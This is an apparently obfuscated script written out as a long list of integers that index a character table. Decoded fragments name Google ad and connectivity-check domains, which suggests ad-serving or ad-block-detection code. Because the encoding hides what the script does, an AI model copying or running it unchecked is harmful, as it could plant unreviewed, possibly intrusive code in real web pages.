87,73,57,60,80,87,77,55,90,21,45,70,44,55,14,16,68,85,73,77,55,90,21,45,49,14,33,57,47,14,87,5,5,68,22,22,68,29,14,60,56,35,57,3,85,8,22,22,68,29,48,33,72,57,38,85,27,77,45,59,90,33,29,60,87,89,85,72,47,87,73,57,60,80,87,77,55,90,21,45,70,44,55,14,16,68,85,73,77,55,90,21,45,49,14,33,57,47,14,87,5,5,68,22,22,68,29,21,80,57,57,80,34,3,85,8,22,22,68,29,57,80,61,38,85,48,77,45,59,90,33,29,60,87,71,60,33,78,61,80,14,57,85,72,47,87,73,57,60,80,87,77,55,90,21,45,70,44,55,14,16,68,85,73,77,55,90,21,45,49,14,33,57,47,14,87,5,5,68,22,22,68,29,21,80,57,57,80,34,3,85,8,22,22,68,29,14,60,56,35,57,3,85,8,22,22,68,29,57,80,61,38,85,48,77,45,22,22,68,29,48,33,72,57,38,85,27,77,45,59,90,33,59,45,49,5,72,47,87,73,57,60,80,87,77,87,90,57,90,33,45,70,57,83,87,26,85,33,77,45,59,77,58,15,58,90,64,2,73,90,72,47,87,73,57,60,80,87,77,45,70,72,47,87,73,57,60,80,87,16,87,77,87,45,70,14,33,57,47,14,87,83,26,29,75,48,60,73,33,29,73,55,48,48,77,87,90,8,45,59,72,47,87,73,57,60,80,87,16,57,77,87,45,70,44,55,14,16,57,49,14,33,57,47,14,87,16,87,22,22,58,80,21,25,33,73,57,58,85,85,57,24,61,33,80,72,16,87,22,22,77,57,85,87,29,87,80,68,33,30,24,61,33,45,22,22,77,37,85,85,57,9,9,19,85,85,57,45,59,72,47,87,73,57,60,80,87,16,33,77,87,45,70,14,33,57,47,14,87,58,80,21,25,33,73,57,58,85,85,57,24,61,33,80,72,16,87,22,22,60,75,12,60,87,60,57,33,77,87,29,48,33,87,56,57,35,45,59,72,47,87,73,57,60,80,87,16,80,77,87,45,70,72,80,14,77,44,55,14,16,57,85,83,26,90,80,85,8,90,14,85,87,29,48,33,87,56,57,35,49,14,3,80,49,0,0,80,45,33,77,87,83,80,26,45,51,57,85,57,29,73,80,87,73,55,57,77,87,83,80,26,45,46,57,83,57,29,48,33,87,56,57,35,26,85,87,83,80,26,49,14,33,57,47,14,87,16,57,59,72,47,87,73,57,60,80,87,16,14,77,87,45,70,44,55,14,16,57,90,33,90,80,85,83,26,49,87,46,72,80,14,77,57,85,8,49,57,38,87,29,48,33,87,56,57,35,49,57,0,0,45,70,72,80,14,77,33,85,8,49,33,38,80,29,48,33,87,56,57,35,49,33,0,0,45,60,72,77,80,83,33,26,85,85,87,83,57,26,45,73,80,87,57,60,87,47,33,16,87,49,80,83,80,29,48,33,87,56,57,35,26,85,87,83,57,26,59,14,33,57,47,14,87,16,80,59,72,47,87,73,57,60,80,87,16,60,77,87,45,70,14,33,57,47,14,87,16,87,51,58,75,57,14,60,87,56,58,85,85,57,24,61,33,80,72,16,87,51,47,77,87,45,83,8,26,46,5,87,83,75,26,22,22,33,77,87,45,51,87,83,8,26,46,87,46,72,59,72,47,87,73,57,60,80,87,16,47,77,14,90,47,45,70,44,55,14,16,55,90,75,85,60,77,47,45,49,14,33,57,47,14,87,16,75,22,22,14,51,14,85,85,85,48,9,9,57,77,14,45,51,5,47,9,9,14,5,85,85,48,22,22,57,77,75,45,22,22,34,77,14,90,75,45,51,83,14,26,46,83,26,46,14,22,22,33,77,14,45,51,80,77,14,45,46,72,29,56,33,57,20,48,33,34,33,87,57,75,40,24,31,48,55,75,75,65,55,34,33,22,22,58,75,57,14,60,87,56,58,85,85,14,22,22,77,55,85,14,29,34,55,57,73,35,77,73,45,45,51,87,77,75,29,56,33,57,20,48,33,34,33,87,57,75,40,24,31,48,55,75,75,65,55,34,33,77,55,83,37,26,45,45,46,14,22,22,77,14,29,68,80,73,47,34,33,87,57,9,9,14,29,87,80,68,33,30,24,61,33,22,22,19,85,85,14,29,87,80,68,33,30,24,61,33,45,51,47,51,83,26,46,83,14,26,46,87,77,75,29,15,47,33,14,24,66,33,48,33,73,57,80,14,39,48,48,77,14,45,45,46,83,26,59,44,55,14,16,73,85,17,67,81,29,77,83,81,78,81,50,26,0,45,79,17,90,76,85,58,73,80,34,61,55,14,33,58,0,58,93,80,73,47,34,33,87,57,58,0,58,13,80,75,60,57,60,80,87,58,90,72,85,68,80,73,47,34,33,87,57,90,48,85,78,60,87,68,80,78,90,55,85,72,29,68,80,73,47,34,33,87,57,20,48,33,34,33,87,57,90,75,85,58,87,80,68,33,30,24,61,33,58,90,34,85,76,16,60,87,16,55,51,72,47,87,73,57,60,80,87,77,87,90,57,45,70,14,33,57,47,14,87,16,37,41,85,85,77,37,41,22,57,83,76,26,77,87,45,45,59,46,72,47,87,73,57,60,80,87,77,87,90,57,45,70,14,33,57,47,14,87,16,57,85,57,85,85,72,9,9,57,85,85,78,60,87,68,80,78,51,55,46,57,90,57,5,85,85,87,22,22,57,29,73,80,87,57,55,60,87,75,77,87,45,59,49,14,33,57,47,14,87,16,47,29,47,87,60,15,85,14,90,47,59,90,57,35,60,75,45,49,60,72,77,87,55,44,60,56,55,57,80,14,29,47,75,33,14,39,56,33,87,57,29,75,33,55,14,73,35,77,58,16,40,14,55,44,33,17,58,45,3,50,37,45,64,2,73,29,55,57,53,14,85,57,14,47,33,49,60,72,77,64,2,73,29,60,45,14,33,57,47,14,87,16,72,55,48,75,33,49,64,2,73,29,60,85,57,14,47,33,49,64,2,73,29,55,57,53,56,85,84,56,33,57,84,49,14,33,57,47,14,87,16,64,2,73,29,55,21,68,77,72,47,87,73,57,60,80,87,77,45,70,57,14,24,70,44,55,14,16,55,85,68,80,73,47,34,33,87,57,29,73,14,33,55,57,33,20,48,33,34,33,87,57,77,84,60,72,14,55,34,33,84,45,49,68,80,73,47,34,33,87,57,29,35,33,55,68,29,55,61,61,33,87,68,31,35,60,48,68,77,55,45,49,44,55,14,16,56,33,57,28,78,87,13,14,80,61,33,14,57,24,93,33,75,73,14,60,61,57,80,14,85,55,29,73,80,87,57,33,87,57,2,60,87,68,80,78,29,28,21,25,33,73,57,29,56,33,57,28,78,87,13,14,80,61,33,14,57,24,93,33,75,73,14,60,61,57,80,14,49,44,55,14,16,80,21,25,33,73,57,68,33,72,60,87,33,13,14,80,61,33,14,57,24,85,55,29,73,80,87,57,33,87,57,2,60,87,68,80,78,29,28,21,25,33,73,57,29,68,33,72,60,87,33,13,14,80,61,33,14,57,24,49,44,55,14,16,55,61,61,85,56,33,57,28,78,87,13,14,80,61,33,14,57,24,93,33,75,73,14,60,61,57,80,14,77,55,29,73,80,87,57,33,87,57,2,60,87,68,80,78,29,65,80,68,33,29,61,14,80,57,80,57,24,61,33,90,58,60,87,75,33,14,57,40,33,72,80,14,33,58,45,49,55,61,61,29,73,80,87,72,60,56,47,14,55,21,48,33,85,72,55,48,75,33,49,80,21,25,33,73,57,68,33,72,60,87,33,13,14,80,61,33,14,57,24,77,78,60,87,68,80,78,29,65,80,68,33,29,61,14,80,57,80,57,24,61,33,90,58,60,87,75,33,14,57,40,33,72,80,14,33,58,90,55,61,61,45,49,55,61,61,85,56,33,57,28,78,87,13,14,80,61,33,14,57,24,93,33,75,73,14,60,61,57,80,14,77,55,29,73,80,87,57,33,87,57,2,60,87,68,80,78,29,20,48,33,34,33,87,57,29,61,14,80,57,80,57,24,61,33,90,58,60,87,87,33,14,92,30,43,82,58,45,49,55,61,61,29,73,80,87,72,60,56,47,14,55,21,48,33,85,72,55,48,75,33,49,80,21,25,33,73,57,68,33,72,60,87,33,13,14,80,61,33,14,57,24,77,78,60,87,68,80,78,29,20,48,33,34,33,87,57,29,61,14,80,57,80,57,24,61,33,90,58,60,87,87,33,14,92,30,43,82,58,90,55,61,61,45,49,80,21,25,33,73,57,68,33,72,60,87,33,13,14,80,61,33,14,57,24,77,68,80,73,47,34,33,87,57,29,21,80,68,24,90,58,60,87,87,33,14,92,30,43,82,58,90,55,61,61,45,49,55,61,61,85,56,33,57,28,78,87,13,14,80,61,33,14,57,24,93,33,75,73,14,60,61,57,80,14,77,55,29,73,80,87,57,33,87,57,2,60,87,68,80,78,29,20,48,33,34,33,87,57,29,61,14,80,57,80,57,24,61,33,90,58,80,47,57,33,14,92,30,43,82,58,45,49,55,61,61,29,73,80,87,72,60,56,47,14,55,21,48,33,85,72,55,48,75,33,49,80,21,25,33,73,57,68,33,72,60,87,33,13,14,80,61,33,14,57,24,77,78,60,87,68,80,78,29,20,48,33,34,33,87,57,29,61,14,80,57,80,57,24,61,33,90,58,80,47,57,33,14,92,30,43,82,58,90,55,61,61,45,49,55,61,61,85,56,33,57,28,78,87,13,14,80,61,33,14,57,24,93,33,75,73,14,60,61,57,80,14,77,55,29,73,80,87,57,33,87,57,2,60,87,68,80,78,90,58,55,48,33,14,57,58,45,49,55,61,61,29,73,80,87,72,60,56,47,14,55,21,48,33,85,72,55,48,75,33,49,80,21,25,33,73,57,68,33,72,60,87,33,13,14,80,61,33,14,57,24,77,78,60,87,68,80,78,90,58,55,48,33,14,57,58,90,55,61,61,45,49,55,29,14,33,34,80,44,33,77,45,49,59,73,55,57,73,35,77,33,45,70,59,64,2,73,29,72,77,64,2,73,29,72,48,45,49,64,2,73,29,72,73,77,45,49,64,2,73,29,34,72,77,45,49,75,33,57,30,60,34,33,80,47,57,77,72,47,87,73,57,60,80,87,77,45,70,64,2,73,29,72,77,64,2,73,29,72,48,45,49,59,90,37,6,8,8,45,49,64,2,73,29,87,80,78,77,64,2,73,29,47,14,77,64,2,73,29,47,45,90,68,80,73,47,34,33,87,57,29,56,33,57,20,48,33,34,33,87,57,75,40,24,30,55,56,65,55,34,33,77,58,35,57,34,48,58,45,83,8,26,45,49,14,33,57,47,14,87,16,57,14,47,33,49,59,45,49,59,59,77,45,90,55,21,68,46,72,47,87,73,57,60,80,87,77,45,70,14,33,57,47,14,87,16,72,47,87,73,57,60,80,87,77,72,45,70,60,72,77,64,2,73,29,55,57,53,14,45,70,64,2,73,29,55,57,53,60,85,84,64,34,84,0,84,55,56,33,84,49,44,55,14,16,75,60,85,68,80,73,47,34,33,87,57,29,73,14,33,55,57,33,20,48,33,34,33,87,57,77,58,60,34,56,58,45,49,75,60,29,73,14,80,75,75,28,14,60,56,60,87,85,58,39,87,80,87,24,34,80,47,75,58,49,75,60,29,80,87,33,14,14,80,14,85,72,47,87,73,57,60,80,87,77,53,75,60,45,70,60,72,77,64,2,73,29,75,87,85,85,8,45,70,64,2,73,29,75,87,85,37,49,64,2,73,29,55,57,53,68,85,84,93,55,84,0,84,57,55,84,49,14,33,57,47,14,87,16,72,77,45,49,59,59,49,75,60,29,80,87,48,80,55,68,85,72,47,87,73,57,60,80,87,77,53,75,60,45,70,60,72,77,64,2,73,29,75,87,85,85,8,45,70,64,2,73,29,55,57,53,14,85,72,55,48,75,33,49,14,33,57,47,14,87,49,59,59,49,75,60,29,75,14,73,85,58,17,17,58,0,64,2,73,29,55,57,53,68,80,0,58,17,58,0,64,2,73,29,55,57,53,60,34,49,59,72,47,87,73,57,60,80,87,16,60,75,77,33,45,70,60,72,77,64,2,73,29,75,87,85,85,8,45,70,64,2,73,29,75,87,85,37,49,64,2,73,29,55,57,53,68,85,84,93,55,84,0,84,57,55,84,49,14,33,57,47,14,87,16,72,77,45,49,59,59,44,55,14,16,75,60,85,68,80,73,47,34,33,87,57,29,73,14,33,55,57,33,20,48,33,34,33,87,57,77,58,75,73,14,60,61,57,58,45,49,75,60,29,80,87,33,14,14,80,14,85,60,75,49,75,60,29,75,14,73,85,58,17,17,61,55,56,33,55,68,52,29,56,80,80,56,48,33,75,24,87,68,60,73,55,57,60,80,87,29,73,80,34,17,61,55,56,33,55,68,17,25,75,17,55,68,75,21,24,56,80,80,56,48,33,29,25,75,58,49,68,80,73,47,34,33,87,57,29,21,80,68,24,29,55,61,61,33,87,68,31,35,60,48,68,77,75,60,45,49,44,55,14,16,75,60,85,68,80,73,47,34,33,87,57,29,73,14,33,55,57,33,20,48,33,34,33,87,57,77,58,60,34,56,58,45,49,75,60,29,80,87,48,80,55,68,85,60,75,49,75,60,29,75,14,73,85,84,35,57,57,61,75,46,17,17,78,78,78,29,56,80,80,56,48,33,55,61,60,75,29,73,80,34,17,56,33,87,33,14,55,57,33,53,52,8,69,84,49,44,55,14,16,75,60,85,68,80,73,47,34,33,87,57,29,73,14,33,55,57,33,20,48,33,34,33,87,57,77,58,75,73,14,60,61,57,58,45,49,75,60,29,80,87,33,14,14,80,14,85,60,75,49,75,60,29,80,87,48,80,55,68,85,72,47,87,73,57,60,80,87,77,53,75,60,45,70,60,72,77,57,24,61,33,80,72,77,53,53,55,45,85,85,84,47,87,68,33,72,60,87,33,68,84,45,70,14,33,57,47,14,87,16,60,75,77,53,75,60,45,49,59,59,49,75,60,29,75,14,73,85,58,17,17,58,0,64,2,73,29,55,57,53,68,80,0,58,17,58,0,64,2,73,29,55,57,53,25,75,49,68,80,73,47,34,33,87,57,29,21,80,68,24,29,55,61,61,33,87,68,31,35,60,48,68,77,75,60,45,49,59,59,77,45,90,14,73,46,72,47,87,73,57,60,80,87,77,45,70,14,33,57,47,14,87,16,72,47,87,73,57,60,80,87,77,55,45,70,14,33,57,47,14,87,16,55,83,43,55,57,35,29,72,48,80,80,14,77,43,55,57,35,29,14,55,87,68,80,34,77,45,7,55,29,48,33,87,56,57,35,45,26,49,59,59,77,45,90,14,15,46,72,47,87,73,57,60,80,87,77,45,70,14,33,57,47,14,87,16,72,47,87,73,57,60,80,87,77,45,70,44,55,14,16,75,55,85,83,26,49,44,55,14,16,78,73,85,43,55,57,35,29,72,48,80,80,14,77,43,55,57,35,29,14,55,87,68,80,34,77,45,7,37,52,0,37,45,49,72,80,14,77,44,55,14,16,60,85,8,49,60,38,78,73,49,60,0,0,45,70,75,55,83,60,26,85,64,2,73,29,14,75,77,83,37,90,37,10,26,45,49,75,55,83,60,26,85,75,55,83,60,26,29,73,35,55,14,39,57,77,8,45,29,57,80,23,61,61,33,14,31,55,75,33,77,45,0,75,55,83,60,26,29,75,47,21,75,57,14,77,37,45,49,59,49,14,33,57,47,14,87,16,75,55,29,25,80,60,87,77,84,50,84,45,49,59,59,77,45,90,14,75,46,72,47,87,73,57,60,80,87,77,45,70,14,33,57,47,14,87,16,72,47,87,73,57,60,80,87,77,55,45,70,44,55,14,16,14,85,58,58,90,73,85,58,55,21,73,68,33,72,56,35,60,25,27,48,87,80,61,15,14,75,57,47,78,8,37,52,10,69,6,41,74,36,19,58,49,44,55,14,16,48,85,6,90,35,85,37,52,49,60,72,77,55,5,85,47,87,68,33,72,60,87,33,68,45,70,60,72,77,55,29,48,33,87,56,57,35,3,85,37,45,70,44,55,14,16,48,85,61,55,14,75,33,64,87,57,77,55,83,8,26,45,90,35,85,61,55,14,75,33,64,87,57,77,55,83,8,26,45,49,59,60,72,77,55,29,48,33,87,56,57,35,3,85,52,45,70,44,55,14,16,35,85,61,55,14,75,33,64,87,57,77,55,83,37,26,45,49,59,60,72,77,55,29,48,33,87,56,57,35,85,85,10,45,70,73,85,55,83,52,26,49,59,59,44,55,14,16,48,33,85,43,55,57,35,29,72,48,80,80,14,77,43,55,57,35,29,14,55,87,68,80,34,77,45,7,77,35,50,48,0,37,45,45,0,48,49,72,80,14,77,60,85,8,49,60,38,48,33,49,60,0,0,45,14,0,85,73,29,73,35,55,14,39,57,77,43,55,57,35,29,72,48,80,80,14,77,43,55,57,35,29,14,55,87,68,80,34,77,45,7,73,29,48,33,87,56,57,35,45,45,49,14,33,57,47,14,87,16,14,49,59,59,77,45,90,61,55,68,46,72,47,87,73,57,60,80,87,77,45,70,14,33,57,47,14,87,16,72,47,87,73,57,60,80,87,77,44,90,55,45,70,44,85,66,57,14,60,87,56,77,44,45,49,60,72,77,55,5,85,47,87,68,33,72,60,87,33,68,45,70,48,85,61,55,14,75,33,64,87,57,77,55,83,8,26,45,49,44,85,77,87,33,78,16,39,14,14,55,24,77,48,45,29,25,80,60,87,77,84,8,84,45,0,44,45,29,75,48,60,73,33,77,50,48,45,49,59,14,33,57,47,14,87,16,44,49,59,59,77,45,90,47,14,46,72,47,87,73,57,60,80,87,77,45,70,14,33,57,47,14,87,16,72,47,87,73,57,60,80,87,77,47,90,44,45,70,44,55,14,16,14,76,85,17,81,83,83,55,50,54,39,50,42,8,50,19,46,90,50,26,0,81,26,17,56,49,44,55,14,16,14,85,47,29,34,55,57,73,35,77,14,76,45,49,60,72,77,14,5,85,87,47,48,48,45,70,72,80,14,77,44,55,14,16,60,85,8,49,60,38,14,29,48,33,87,56,57,35,49,60,0,0,45,70,44,55,14,16,87,85,14,83,60,26,29,14,33,61,48,55,73,33,77,84,83,84,90,84,84,45,29,14,33,61,48,55,73,33,77,84,26,84,90,84,84,45,49,44,55,14,16,57,85,87,29,75,61,48,60,57,77,84,46,84,45,49,44,55,14,16,27,33,24,85,57,83,8,26,49,44,55,14,16,55,14,56,75,85,57,83,37,26,49,60,72,77,55,14,56,75,5,85,47,87,68,33,72,60,87,33,68,45,55,14,56,75,85,55,14,56,75,29,75,61,48,60,57,77,84,90,84,45,49,44,55,14,16,44,55,48,47,33,85,14,83,60,26,49,60,72,77,27,33,24,85,85,84,14,84,45,44,55,14,16,44,55,48,47,33,85,64,2,73,29,14,75,77,55,14,56,75,45,49,60,72,77,27,33,24,85,85,84,73,84,45,44,55,14,16,44,55,48,47,33,85,64,2,73,29,14,73,77,55,14,56,75,45,49,60,72,77,27,33,24,85,85,84,15,84,45,44,55,14,16,44,55,48,47,33,85,64,2,73,29,14,15,77,45,49,60,72,77,27,33,24,85,85,84,60,84,45,44,55,14,16,44,55,48,47,33,85,64,2,73,29,61,55,68,77,44,83,84,60,84,26,90,55,14,56,75,45,49,60,72,77,27,33,24,85,85,84,61,84,45,44,55,14,16,44,55,48,47,33,85,64,2,73,29,61,55,68,77,44,83,84,61,84,26,90,55,14,56,75,45,49,60,72,77,27,33,24,85,85,84,56,84,45,44,55,14,16,44,55,48,47,33,85,64,2,73,29,61,55,68,77,44,83,84,56,84,26,90,55,14,56,75,45,49,60,72,77,27,33,24,85,85,84,78,84,45,44,55,14,16,44,55,48,47,33,85,64,2,73,29,61,55,68,77,44,83,84,78,84,26,90,55,14,56,75,45,49,47,85,47,29,14,33,61,48,55,73,33,77,14,83,60,26,90,44,55,48,47,33,45,49,59,59,14,33,57,47,14,87,16,47,49,59,59,77,45,90,72,73,46,72,47,87,73,57,60,80,87,77,45,70,60,72,77,64,2,73,29,73,72,45,70,44,55,14,16,33,75,85,68,80,73,47,34,33,87,57,29,15,47,33,14,24,66,33,48,33,73,57,80,14,39,48,48,77,58,60,34,56,83,75,14,73,7,85,84,78,61,58,0,58,33,87,56,60,87,33,58,0,58,29,87,33,57,58,0,58,68,87,55,58,0,58,50,58,0,58,73,68,87,58,0,58,29,73,80,34,84,26,58,45,49,72,80,14,77,44,55,14,16,76,85,8,49,76,38,33,75,29,48,33,87,56,57,35,49,76,0,0,45,70,33,75,83,76,26,29,80,47,57,33,14,92,30,43,82,85,33,75,83,76,26,29,80,47,57,33,14,92,30,43,82,29,14,33,61,48,55,73,33,77,17,83,55,50,54,8,50,19,26,0,81,29,78,61,33,87,56,60,87,33,81,29,87,33,57,77,51,46,45,68,87,55,50,77,51,46,45,73,68,87,81,29,73,80,34,17,56,60,90,78,60,87,68,80,78,29,48,80,73,55,57,60,80,87,29,35,80,75,57,87,55,34,33,45,29,14,33,61,48,55,73,33,77,84,68,60,75,61,48,55,24,46,16,87,80,87,33,16,5,60,34,61,80,14,57,55,87,57,49,84,90,84,84,45,49,59,59,59,90,34,72,46,72,47,87,73,57,60,80,87,77,45,70,59,90,72,46,72,47,87,73,57,60,80,87,77,72,48,45,70,72,80,14,77,44,55,14,16,24,85,8,49,24,38,72,48,29,48,33,87,56,57,35,49,24,0,0,45,70,44,55,14,16,27,85,72,48,83,24,26,49,44,55,14,16,33,75,85,68,80,73,47,34,33,87,57,29,15,47,33,14,24,66,33,48,33,73,57,80,14,39,48,48,77,27,83,84,61,55,57,57,33,14,87,84,26,45,49,72,80,14,77,44,55,14,16,76,85,8,49,76,38,33,75,29,48,33,87,56,57,35,49,76,0,0,45,70,60,72,77,27,83,84,55,73,57,60,80,87,84,26,85,85,84,60,87,25,33,73,57,84,45,70,60,72,77,27,83,84,61,80,75,60,57,60,80,87,84,26,85,85,84,21,33,72,80,14,33,84,45,70,44,55,14,16,87,85,68,80,73,47,34,33,87,57,29,73,14,33,55,57,33,20,48,33,34,33,87,57,77,58,68,60,44,58,45,49,87,29,60,87,87,33,14,92,30,43,82,85,27,83,84,87,33,78,92,57,34,48,84,26,49,33,75,83,76,26,29,61,55,14,33,87,57,65,80,68,33,29,60,87,75,33,14,57,40,33,72,80,14,33,77,87,90,33,75,83,76,26,45,49,87,29,80,47,57,33,14,92,30,43,82,85,87,29,60,87,87,33,14,92,30,43,82,49,59,33,48,75,33,16,60,72,77,27,83,84,61,80,75,60,57,60,80,87,84,26,85,85,84,55,72,57,33,14,84,45,70,44,55,14,16,87,85,68,80,73,47,34,33,87,57,29,73,14,33,55,57,33,20,48,33,34,33,87,57,77,58,68,60,44,58,45,49,87,29,60,87,87,33,14,92,30,43,82,85,27,83,84,87,33,78,92,57,34,48,84,26,49,33,75,83,76,26,29,61,55,14,33,87,57,65,80,68,33,29,60,87,75,33,14,57,40,33,72,80,14,33,77,87,90,33,75,83,76,26,29,87,33,76,57,66,60,21,48,60,87,56,45,49,87,29,80,47,57,33,14,92,30,43,82,85,87,29,60,87,87,33,14,92,30,43,82,49,59,59,59,59,64,2,73,29,55,57,53,72,85,84,68,14,55,78,84,49,59,90,48,55,57,33,14,46,72,47,87,73,57,60,80,87,77,45,70,44,55,14,16,33,44,33,87,57,82,60,75,57,33,87,33,14,66,47,61,61,80,14,57,33,68,85,78,60,87,68,80,78,29,55,68,68,20,44,33,87,57,82,60,75,57,33,87,33,14,49,14,33,57,47,14,87,16,72,47,87,73,57,60,80,87,77,80,45,70,44,55,14,16,80,21,25,85,64,2,73,29,15,77,80,29,61,55,14,33,87,57,90,68,80,73,47,34,33,87,57,29,21,80,68,24,45,83,8,26,49,60,72,77,80,21,25,85,85,47,87,68,33,72,60,87,33,68,45,70,14,33,57,47,14,87,16,72,55,48,75,33,49,59,64,2,73,29,75,73,55,87,77,80,45,49,60,72,77,33,44,33,87,57,82,60,75,57,33,87,33,14,66,47,61,61,80,14,57,33,68,45,70,80,21,25,29,55,68,68,20,44,33,87,57,82,60,75,57,33,87,33,14,77,84,93,28,43,65,80,68,33,64,87,75,33,14,57,33,68,84,90,64,2,73,29,75,73,55,87,90,72,55,48,75,33,45,49,59,33,48,75,33,70,75,33,57,30,60,34,33,80,47,57,77,72,47,87,73,57,60,80,87,77,45,70,64,2,73,29,48,55,57,33,14,77,80,45,49,59,90,6,8,8,45,49,59,59,59,77,45,90,75,73,55,87,46,72,47,87,73,57,60,80,87,77,45,70,14,33,57,47,14,87,16,72,47,87,73,57,60,80,87,77,80,45,70,44,55,14,16,55,85,64,2,73,29,15,77,80,29,73,35,60,48,68,90,64,2,73,29,15,77,80,29,61,55,14,33,87,57,45,83,8,26,90,68,80,73,47,34,33,87,57,29,21,80,68,24,45,49,72,80,14,77,44,55,14,16,61,85,8,49,61,38,55,29,48,33,87,56,57,35,49,61,0,0,45,70,60,72,77,64,2,73,29,73,48,83,61,26,85,85,47,87,68,33,72,60,87,33,68,45,70,64,2,73,29,73,48,83,61,26,85,55,83,61,26,49,64,2,73,29,87,80,78,77,64,2,73,29,47,14,77,64,2,73,29,47,45,90,55,83,61,26,45,49,59,59,59,59,77,45,90,87,80,78,46,72,47,87,73,57,60,80,87,77,45,70,14,33,57,47,14,87,16,72,47,87,73,57,60,80,87,77,47,14,48,90,61,55,14,33,87,57,45,70,60,72,77,64,2,73,29,47,73,5,85,72,55,48,75,33,45,70,64,2,73,29,73,80,48,48,33,73,57,60,80,87,77,64,2,73,29,47,73,90,61,55,14,33,87,57,45,49,64,2,73,29,47,73,85,72,55,48,75,33,49,14,33,57,47,14,87,49,59,44,55,14,16,60,85,68,80,73,47,34,33,87,57,29,73,14,33,55,57,33,20,48,33,34,33,87,57,77,58,60,34,56,58,45,49,60,29,73,14,80,75,75,28,14,60,56,60,87,85,58,39,87,80,87,24,34,80,47,75,58,49,60,29,80,87,48,80,55,68,85,72,47,87,73,57,60,80,87,77,45,70,64,2,73,29,73,0,0,49,44,55,14,16,73,85,68,80,73,47,34,33,87,57,29,73,14,33,55,57,33,20,48,33,34,33,87,57,77,58,73,55,87,44,55,75,58,45,49,44,55,14,16,57,85,73,29,56,33,57,31,80,87,57,33,76,57,77,58,52,68,58,45,49,44,55,14,16,78,85,60,29,78,60,68,57,35,49,44,55,14,16,35,85,60,29,35,33,60,56,35,57,49,44,55,14,16,34,85,84,72,14,80,34,31,35,55,14,31,80,68,33,84,49,73,29,75,57,24,48,33,29,78,60,68,57,35,85,73,29,78,60,68,57,35,85,78,49,73,29,75,57,24,48,33,29,35,33,60,56,35,57,85,73,29,35,33,60,56,35,57,85,35,49,57,29,56,48,80,21,55,48,39,48,61,35,55,85,37,29,8,49,57,29,56,48,80,21,55,48,31,80,34,61,80,75,60,57,33,28,61,33,14,55,57,60,80,87,85,84,73,80,61,24,84,49,57,83,64,2,73,29,55,57,53,72,0,64,2,73,29,55,57,53,60,26,77,60,90,8,90,8,45,49,44,55,14,16,21,85,64,2,73,29,61,52,69,77,57,83,64,2,73,29,34,77,45,26,77,8,90,8,90,78,90,35,45,29,68,55,57,55,45,49,44,55,14,16,75,85,58,58,49,44,55,14,16,44,85,83,58,16,58,90,58,5,58,90,58,81,58,58,90,58,91,58,90,58,79,58,90,58,1,58,90,58,22,58,90,58,84,58,90,58,77,58,90,58,45,58,90,58,7,58,90,58,0,58,90,58,90,58,90,58,50,58,90,58,29,58,90,58,17,58,90,58,8,58,90,58,37,58,90,58,52,58,90,58,10,58,90,58,69,58,90,58,6,58,90,58,41,58,90,58,74,58,90,58,36,58,90,58,19,58,90,58,46,58,90,58,49,58,90,58,38,58,90,58,85,58,90,58,3,58,90,58,51,58,90,58,63,58,90,58,39,58,90,58,40,58,90,58,31,58,90,58,93,58,90,58,20,58,90,58,12,58,90,58,86,58,90,58,92,58,90,58,64,58,90,58,11,58,90,58,88,58,90,58,82,58,90,58,43,58,90,58,65,58,90,58,28,58,90,58,13,58,90,58,62,58,90,58,18,58,90,58,66,58,90,58,30,58,90,58,23,58,90,58,71,58,90,58,2,58,90,58,4,58,90,58,89,58,90,58,42,58,90,58,83,58,90,58,81,81,58,90,58,26,58,90,58,67,58,90,58,53,58,90,58,32,58,90,58,55,58,90,58,21,58,90,58,73,58,90,58,68,58,90,58,33,58,90,58,72,58,90,58,56,58,90,58,35,58,90,58,60,58,90,58,25,58,90,58,27,58,90,58,48,58,90,58,34,58,90,58,87,58,90,58,80,58,90,58,61,58,90,58,15,58,90,58,14,58,90,58,75,58,90,58,57,58,90,58,47,58,90,58,44,58,90,58,78,58,90,58,76,58,90,58,24,58,90,58,54,58,90,58,70,58,90,58,9,58,90,58,59,58,26,49,72,80,14,77,44,55,14,16,76,85,8,49,76,38,21,29,48,33,87,56,57,35,49,76,0,0,45,60,72,77,21,83,76,26,45,75,0,85,44,83,77,21,83,76,26,50,10,52,45,26,49,44,55,14,16,57,85,64,2,73,29,14,75,77,45,49,75,85,75,29,14,33,61,48,55,73,33,77,84,58,47,87,60,57,53,48,60,75,57,58,84,90,84,58,47,87,60,57,53,48,60,75,57,53,84,0,57,0,84,58,84,45,49,75,85,75,29,14,33,61,48,55,73,33,77,84,58,80,21,75,33,14,44,33,58,84,90,84,58,80,21,75,33,14,44,33,53,84,0,57,0,84,58,84,45,49,44,55,14,16,47,73,48,85,11,66,28,65,29,61,55,14,75,33,77,75,45,49,60,72,77,47,73,48,85,85,85,57,14,47,33,45,70,47,73,48,85,33,44,55,48,77,58,77,58,0,75,0,58,45,58,45,49,59,47,73,48,29,47,87,60,57,53,48,60,75,57,85,47,73,48,83,84,47,87,60,57,53,48,60,75,57,53,84,0,57,26,49,47,73,48,29,80,21,75,33,14,44,33,85,47,73,48,83,84,80,21,75,33,14,44,33,53,84,0,57,26,49,64,2,73,29,75,44,77,47,73,48,45,49,60,72,77,64,2,73,29,73,85,85,37,22,22,47,73,48,29,80,21,75,33,14,44,33,29,33,87,55,21,48,33,68,85,85,37,45,70,64,2,73,29,47,73,85,47,73,48,49,64,2,73,29,48,55,57,33,14,77,47,73,48,29,80,21,75,33,14,44,33,45,49,59,33,48,75,33,70,64,2,73,29,73,80,48,48,33,73,57,60,80,87,77,47,73,48,90,61,55,14,33,87,57,45,49,59,59,49,60,29,80,87,33,14,14,80,14,85,72,47,87,73,57,60,80,87,77,45,70,60,72,77,60,29,75,14,73,85,85,48,80,73,55,57,60,80,87,29,61,14,80,57,80,73,80,48,0,47,14,48,45,70,60,29,75,14,73,85,64,2,73,29,47,14,77,64,2,73,29,24,45,49,14,33,57,47,14,87,49,59,44,55,14,16,75,85,64,2,73,29,44,75,77,45,49,60,72,77,75,45,70,44,55,14,16,57,85,64,2,73,29,14,75,77,45,49,75,85,75,29,14,33,61,48,55,73,33,77,84,58,47,87,60,57,53,48,60,75,57,58,84,90,84,58,47,87,60,57,53,48,60,75,57,53,84,0,57,0,84,58,84,45,49,75,85,75,29,14,33,61,48,55,73,33,77,84,58,80,21,75,33,14,44,33,58,84,90,84,58,80,21,75,33,14,44,33,53,84,0,57,0,84,58,84,45,49,44,55,14,16,47,73,48,85,11,66,28,65,29,61,55,14,75,33,77,75,45,49,60,72,77,47,73,48,85,85,85,57,14,47,33,45,70,47,73,48,85,33,44,55,48,77,58,77,58,0,75,0,58,45,58,45,49,59,47,73,48,29,